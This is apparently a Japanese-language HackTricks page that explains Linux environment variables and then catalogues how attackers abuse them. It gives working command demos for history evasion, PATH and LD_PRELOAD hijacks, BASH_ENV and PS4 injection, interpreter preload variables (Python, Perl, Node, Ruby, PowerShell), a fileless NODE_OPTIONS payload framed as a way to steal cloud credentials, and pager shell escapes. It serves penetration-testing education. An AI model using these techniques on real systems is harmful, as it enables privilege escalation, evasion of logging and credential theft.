# Linux 環境変数

{{#include ../../banners/hacktricks-training.md}}

## グローバル変数

グローバル変数は**子プロセス**に継承されます。

現在のセッション用にグローバル変数を作成するには、次のようにします。

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

この変数は、現在のセッションおよびその子プロセスからアクセスできます。

変数は次のように**削除**できます。

```bash
unset MYGLOBAL
```

## ローカル変数

**ローカル変数**は、**現在のシェル/スクリプト**からのみ**アクセス**できます。

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## 現在の変数を一覧表示する

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

`/proc/*/environ` の内容は **NUL区切り**なので、通常は次の方法のほうが読みやすくなります:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

継承された環境内で**認証情報**や**興味深いサービス設定**を探している場合は、[Linux Post Exploitation](../post-exploitation/README.md) も確認してください。

## よく使われる変数

参照元: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)。<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** が使用するディスプレイ。この変数は通常 **:0.0** に設定され、現在のコンピューターの最初のディスプレイを意味します。
- **EDITOR** – ユーザーが優先して使うテキストエディター。
- **HISTFILESIZE** – history file に含める最大行数。
- **HISTSIZE** – ユーザーがセッションを終了したときに history file に追加される行数。
- **HOME** – ホームディレクトリ。
- **HOSTNAME** – コンピューターのホスト名。
- **LANG** – 現在の言語。
- **MAIL** – ユーザーのメールスプールの場所。通常は **/var/spool/mail/USER**。
- **MANPATH** – マニュアルページを検索するディレクトリの一覧。
- **OSTYPE** – オペレーティングシステムの種類。
- **PS1** – bash のデフォルトプロンプト。
- **PATH** – 相対パスや絶対パスを指定せず、ファイル名だけで実行できるバイナリファイルを含むディレクトリのパスを格納します。
- **PWD** – 現在の作業ディレクトリ。
- **SHELL** – 現在のコマンドシェルへのパス（例: **/bin/bash**）。
- **TERM** – 現在の端末の種類（例: **xterm**）。
- **TZ** – タイムゾーン。
- **USER** – 現在のユーザー名。

## hacking に役立つ変数

すべての変数が同じように役立つわけではありません。攻撃者の視点では、**検索パス**、**起動ファイル**、**dynamic linker の動作**、または**監査やログ記録**を変更する変数を優先して確認してください。

### **HISTFILESIZE**

**この変数の値を 0 に変更**すると、**セッションを終了したとき**に **history file**（\~/.bash_history）が**0 行に切り詰められます**。

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

この変数の**値を 0 に変更**すると、コマンドは**メモリ上の履歴に保存されず**、**履歴ファイル**（\~/.bash_history）にも書き込まれません。

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

**この変数の値が `ignorespace` または `ignoreboth` に設定されている場合**、先頭に余分なスペースを付けたコマンドは履歴に保存されません。

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

**history file** を **`/dev/null`** に設定するか、完全に unset してください。これは、history のサイズを変更するだけの場合よりも、一般に信頼性が高い方法です。

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

プロセスは、**http または https** 経由でインターネットに接続する際、ここで宣言された **proxy** を使用します。

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: これを尊重するツールやプロトコルのデフォルトプロキシ。
- `no_proxy`: 直接接続するホスト／ドメイン／CIDRの除外リスト。

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

小文字と大文字のどちらの形式も、ツールによって使用される場合があります（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

プロセスは、**これらの環境変数**で指定された証明書を信頼します。これは、**`curl`**、**`git`**、Python の HTTP クライアント、パッケージマネージャーなどのツールに、攻撃者が管理する CA を信頼させるのに役立ちます（たとえば、interception proxy を正規のものに見せかける場合）。

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

特権 wrapper/script が**絶対パスを使わずに**コマンドを実行する場合、**攻撃者が制御できる最初のディレクトリ**が `PATH` 内で優先されます。これは、`sudo`、cron job、shell wrapper、カスタム SUID helper での多くの **PATH hijacks** の基本となる手法です。`env_keep+=PATH`、脆弱な `secure_path`、または `tar`、`service`、`cp`、`python` などを名前で呼び出す wrapper を探しましょう。

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

`PATH`を悪用する完全な権限昇格チェーンについては、[Linux Privilege Escalation](linux-privilege-escalation/README.md)を確認してください。

### **HOME & XDG_CONFIG_HOME**

`HOME`は単なるディレクトリ参照ではありません。多くのツールは、`$HOME`または`$XDG_CONFIG_HOME`から**dotfiles**、**plugins**、**ユーザーごとの設定**を自動的に読み込みます。特権ワークフローでこれらの値が引き継がれる場合、バイナリの乗っ取りよりも**config injection**が容易なことがあります。

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Interestingなターゲットには、`.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`、および `.terraformrc` のようなツール固有のファイルがあります。

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

これらの変数は**dynamic linker**に影響します。

- `LD_PRELOAD`: 追加の共有オブジェクトを最初に読み込むよう強制します。
- `LD_LIBRARY_PATH`: ライブラリ検索ディレクトリを先頭に追加します。
- `LD_AUDIT`: ライブラリの読み込みとシンボル解決を監視する auditor ライブラリを読み込みます。

特権コマンドがこれらの変数を引き継ぐ場合、**hooking**、**instrumentation**、**privilege escalation**に非常に有用です。**secure-execution** モード（`AT_SECURE`、例: setuid/setgid/capabilities）では、loader はこれらの変数の多くを削除または制限します。しかし、この初期 loader ステージでの parser バグは、ターゲットプログラムより**前に**実行されるため、依然として影響が大きいものです。<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` は glibc の初期段階の動作（allocator tunables など）を変更でき、exploit lab で非常に便利です。また、**dynamic loader が非常に早い段階で解析する**ため、セキュリティの観点からも重要です。2023 年の **Looney Tunables** バグは、loader で解析される単一の環境変数が、SUID プログラムに対する**ローカル権限昇格のプリミティブ**になり得ることを改めて示しました。<sup>[[6]](#references)</sup>

CVE-2023-4911 については、**インストール済みのディストリビューションパッケージのリリース**をベンダーの修正済みリリースと比較し、新しいプロセスで実際に使用される loader を確認してください。upstream のバージョン文字列だけでは信頼できません。Debian は影響を受ける parser を 2.31 パッケージにバックポートしている一方、ディストリビューションによっては upstream の番号を変更せずに修正をバックポートしています。実際に権限を移行するには、`NoNewPrivs`、`nosuid` マウント、その他の緩和策によって ID の変更が阻止されない、権限付き実行可能ファイルのターゲットも必要です。受動的な列挙中に、不正な `GLIBC_TUNABLES` を使ったクラッシュプローブを実行するのは避けてください。リリースごとの適用状況については、[Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911)、[Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911)、[Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) を参照してください。また、Ubuntu の [security notice](https://ubuntu.com/security/notices/USN-6409-1) では、更新後の再起動も求めています。

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

**Bash** が**非対話モード**で起動すると、`BASH_ENV` を確認し、対象のスクリプトを実行する前にそのファイルを source します。Bash が `sh` として起動された場合や、POSIX 形式の対話モードでは、`ENV` も参照されることがあります。環境変数を攻撃者が制御できる場合、これはシェルラッパーをコード実行に利用する典型的な手法です。

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash は **real/effective IDs が異なる**場合、これらの起動ファイルを無視します。`-p` は effective ID を保持しますが、これらの起動ファイルを有効にはしないため、正確な動作は wrapper がどのように shell を起動するかによって異なります。Bash を起動する**前に** `setuid()`/`setgid()` を呼び出す privileged wrapper には注意してください。ID が再び一致すると、Bash は、通常なら無視する `BASH_ENV`、`ENV`、関連する shell state を信頼する可能性があります。<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash で **xtrace** が有効になっていると、各トレース対象コマンドの前に `PS4` を展開して表示します。`PS4` は prompt と同様に展開されるため、その中の **command substitution** が実行されます。重要なのは、環境から `SHELLOPTS=xtrace` を export するだけで xtrace を有効にできることです。コマンドラインで `-x` を指定する必要はありません。そのため、victim が実行する Bash script はどれも code execution につながります。<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` は xtrace が有効になるまで何もしません（`SHELLOPTS=xtrace`、`set -x`、または `bash -x`）。Bash は `BASH_ENV` と同様に、特権/setuid コンテキストでは `SHELLOPTS` を破棄します。

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

これらの変数は Python の起動方法を変更します。

- `PYTHONPATH`: import の検索パスの先頭にパスを追加します。
- `PYTHONHOME`: 標準ライブラリのツリーの場所を変更します。
- `PYTHONSTARTUP`: 対話プロンプトの表示前にファイルを実行します。
- `PYTHONINSPECT=1`: スクリプトの終了後、対話モードに移行します。
- `PYTHONBREAKPOINT`: コードが `breakpoint()` に到達したときに呼び出される（また、そのモジュールが import される）`package.module.callable` を指定します。<sup>[[8]](#references)</sup>

これらは、制御可能な環境で Python を呼び出すメンテナンススクリプト、デバッガー、シェル、ラッパーに対して有効です。`python -E` と `python -I` は、すべての `PYTHON*` 変数を無視します。

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

最近の実例として、2024年にUbuntu/Debianシステムで発生した **needrestart** のLPEがあります。root所有のscannerは、`/proc/<PID>/environ`から非特権プロセスの`PYTHONPATH`をコピーし、その後Pythonを実行していました。公開されたexploitは、攻撃者が制御するパスに`importlib/__init__.so`を配置し、helperにハードコードされたスクリプトが問題になる前に、Python自身の初期化中に攻撃者のコードを実行させました。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perlにも、同様に有用な起動時変数があります。

- `PERL5LIB`: ライブラリディレクトリを検索パスの先頭に追加します。
- `PERL5OPT`: すべての`perl`コマンドラインに指定されているかのように、switchを挿入します。

これにより、対象スクリプトが何か意味のある処理を始める前に、**モジュールの自動読み込み**を強制したり、interpreterの動作を変更したりできます。Perlは**taint / setuid / setgid**コンテキストではこれらの変数を無視しますが、通常のroot実行wrapper、CIジョブ、installer、カスタムsudoersルールでは依然として大きな意味を持ちます。

sudoルールが環境変数の上書きを許可していて、特権コマンドが最終的にPerlを起動する場合は、`PERL5DB`も確認してください。Perlのドキュメントによると、`PERL5OPT=-d`はdebuggerを起動し、`PERL5DB`はPerlが単独の`-d` switchで起動したときのdebugger初期化コードを指定します。`PERL5LIB`と`PERLLIB`だけをunsetしても、この経路は塞げません。これらの変数がsudoとwrapperを通過してPerlプロセスまで届き、かつPerlがtaintまたはset-IDの処理によって無視しないことが条件です。列挙中に特権helperを実行せず、正確なルールと実行チェーンを調査してください。[perlrunの環境変数に関するリファレンス](https://perldoc.perl.org/perlrun#ENVIRONMENT)を参照してください。

Perl組み込みの[`@INC`検索パス](https://perldoc.perl.org/perlvar#@INC)も、環境変数が引き継がれていない場合でも、モジュールの信頼境界となります。特権Perlプロセスについては、実際の`use`または`require`文、解決されるモジュール名、検索順序、そして検索対象ディレクトリ内で低権限ユーザーがそのモジュールを作成または置き換えられるかどうかを照合してください。ライブラリディレクトリに書き込み権限があるだけでは、特権プロセスがそこからコードを読み込むとは限りません。

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` は、環境を継承するすべての `node` プロセスに **Node.js CLI flags** を先頭に追加します。そのため、最終的に Node を呼び出す wrapper、CI jobs、Electron helpers、sudo rules に対して有用です。攻撃側で特に注目すべき flags は通常、次のとおりです。

- `--require <file>`: 対象スクリプトの実行前に CommonJS file を preload します。
- `--import <module>`: 対象スクリプトの実行前に ES module を preload します。

Node は `NODE_OPTIONS` 内の一部の危険な flags を拒否しますが、`--require` と `--import` は明示的に許可されており、通常の command-line arguments より**前に**処理されます。<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### `data:` URLを使ったファイルレスのpreload

`NODE_OPTIONS`を設定できても、ターゲット上に**ファイルを書き込めない**場合（読み取り専用ファイルシステム、制限付きAPI、serverless runtimeなど）、`--import`は`data:text/javascript,` URLを受け付けるため、payload全体を環境変数内に含められます。JavaScriptは**完全にURLエンコードする**必要があります。Nodeは値をURLとして解析するため、生のスペース（またはその他の未エンコード文字）があるとpayloadが途中で切り詰められ、`SyntaxError`が発生します。これは、`--import`が`NODE_OPTIONS`のallowlistに含まれているNode 20.6以降で動作します。<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> これは、関数が Node を実行する**マネージドクラウドランタイム**で、`NODE_OPTIONS` の制御を RCE につなげる一般的な方法です。たとえば、Lambda の設定変更（`lambda:UpdateFunctionConfiguration`）だけが可能で、`iam:PassRole` やコードの更新ができない攻撃者でも、`NODE_OPTIONS=--import data:text/javascript,<payload>` を注入して関数内でコードを実行し、実行ロールの認証情報を盗めます。注入されたモジュールはハンドラーより**前に**実行され、その後ハンドラーは通常どおり実行されます。

`NODE_OPTIONS` を間接的に設定するリモート gadget chain（例：prototype-pollution による RCE）については、[こちらのページ](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)を確認してください。

### **RUBYLIB & RUBYOPT**

Ruby にも、同種の起動時悪用手法があります。

- `RUBYLIB`: Ruby の load path の先頭にディレクトリを追加します。
- `RUBYOPT`: すべての `ruby` 呼び出しに `-r` などのコマンドラインオプションを注入します。

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

2024年の**needrestart**の脆弱性は、これは単なるラボでの小技ではないことを示しました。`PYTHONPATH`の悪用に対して脆弱だった同じroot所有のヘルパーは、攻撃者が制御する`RUBYLIB`を使ってRubyを実行させ、攻撃者のディレクトリから`enc/encdb.so`を読み込ませることもできました。<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovimは通常の起動時に、`VIMINIT`（またはフォールバック先の`EXINIT`）に含まれるExコマンドを実行します。Exコマンドには`:!cmd`や`:call system(...)`が含まれるため、この変数を制御すれば、被害者がVimを開くたびにコードを実行できます（rootでの`sudo vim`、`crontab -e`、`visudo`、`$EDITOR`を起動する`git`/`less`など）。<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) ではこれらの変数はスキップされますが、通常の対話型起動では実行されます。

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) は Linux/macOS（および Windows）で動作する **.NET アプリケーション**であるため、いくつかの環境変数を使うと、環境変数を引き継いだ任意の `pwsh` 呼び出しでコード実行が可能になります。cron/systemd ジョブ、CI runner、`pwsh` を呼び出す特権ラッパーに対して有用です。

- `PSModulePath`: PowerShell はこのリスト内のすべてのディレクトリを再帰的に検索して `.psd1`/`.psm1` モジュールを探し、エクスポートされたコマンドが初めて参照された時点で、そのモジュールを **自動読み込み**します。ディレクトリを先頭に追加すると、モジュールのトップレベルコードがインポート時に実行されます。また、解決順序は *Alias → Function → Cmdlet* なので、エクスポートされた関数で、被害者が呼び出す組み込み cmdlet を上書きすることもできます。<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: `powershell/Microsoft.PowerShell_profile.ps1` の配置先を変更します。このファイルは起動時に実行されます（`-NoProfile` を指定した場合を除く）。
- `DOTNET_STARTUP_HOOKS`: `Main` の前に `StartupHook.Initialize()` が実行される managed assembly です（すべての .NET アプリで共有されます）。
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API により、起動時に攻撃者のライブラリがプロセスへ読み込まれます（パス変数はレジストリより優先されます。`DOTNET_*` は新しい別名です）。Windows PowerShell 5.1（.NET Framework）では `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` を使います。MITRE ATT&CK T1574.012。<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Windowsでは、`PSExecutionPolicyPreference=Bypass`を設定すると、「unsigned scripts blocked」というガードレールも解除されるため、仕込んだprofile/moduleが実際に実行されます。完全なPoCについては、専用ページを参照してください。

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER、MANPAGER、GIT_PAGER、GIT_EDITOR & LESSOPEN**

ツールの中には、環境変数からパスを読み取るだけでなく、その値を**shell**、**editor**、または**input preprocessor**に渡すものがあります。そのため、特権wrapperが`git`、`man`、`less`、または同様のテキストビューアーを実行する場合、次の変数は特に注目に値します。

- `PAGER`、`MANPAGER`、`GIT_PAGER`: pagerコマンドを指定します。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`: 多くの場合、引数付きでeditorコマンドを指定します。
- `LESSOPEN`、`LESSCLOSE`: `less`がファイルを開くときに実行するpre/post-processorを定義します。

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Gitは、`GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>`、`GIT_CONFIG_VALUE_<n>`を使って、ディスクに触れずに**環境変数のみで設定を注入**する方法もサポートしています。

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

From a post-exploitation perspective, inherited environments often contain **認証情報**, **proxy 設定**, **service token**、または **cloud key** が含まれていることも覚えておきましょう。[Linux Post Exploitation](../post-exploitation/README.md)で、`/proc/<PID>/environ` と `systemd` の `Environment=` の探索を確認してください。

### PS1

プロンプトの表示を変更します。

[**これは例です**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

root:

![PERL5OPT & PERL5LIB - PS1: これは例です](<../images/image (897).png>)

一般ユーザー:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つの場合](<../images/image (740).png>)

バックグラウンドで実行中のジョブが1つ、2つ、3つの場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つの場合](<../images/image (145).png>)

バックグラウンドジョブが1つあり、停止中のジョブが1つあり、最後のコマンドが正常に終了しなかった場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドジョブが1つあり、停止中のジョブが1つあり、最後のコマンドが正常に終了しなかった場合](<../images/image (715).png>)

## References

- [1] [GNU Bash マニュアル - Bash の起動ファイル](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart における LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI ドキュメント - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [一般的な環境変数 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc の ld.so におけるローカル権限昇格 - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash マニュアル - Bash 変数 (`PS4`) と Set 組み込みコマンド (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - 組み込みの breakpoint() と PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim ドキュメント - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath と PowerShell モジュールの自動読み込み](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET のデバッグおよびプロファイリング構成設定 (`CORECLR_`/`DOTNET_`/`COR_` profiler 変数)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
